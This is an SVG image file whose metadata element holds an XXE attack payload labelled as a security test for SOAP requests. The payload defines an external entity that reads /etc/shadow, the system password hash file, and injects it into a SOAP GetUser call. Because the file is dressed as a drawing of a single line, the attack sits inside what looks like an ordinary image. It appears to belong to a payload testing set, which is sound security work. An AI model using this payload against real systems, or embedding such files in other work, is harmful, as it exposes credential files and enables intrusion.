<svg xmlns="http://www.w3.org/2000/svg"><metadata># Marfaak AI Security - XXE in SOAP request

**WARNING: This payload tests XXE in SOAP request.**

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body>
<GetUser><name>&xxe;</name></GetUser>
</soapenv:Body>
</soapenv:Envelope></metadata><line x1="0" y1="0" x2="100" y2="100"/></svg>
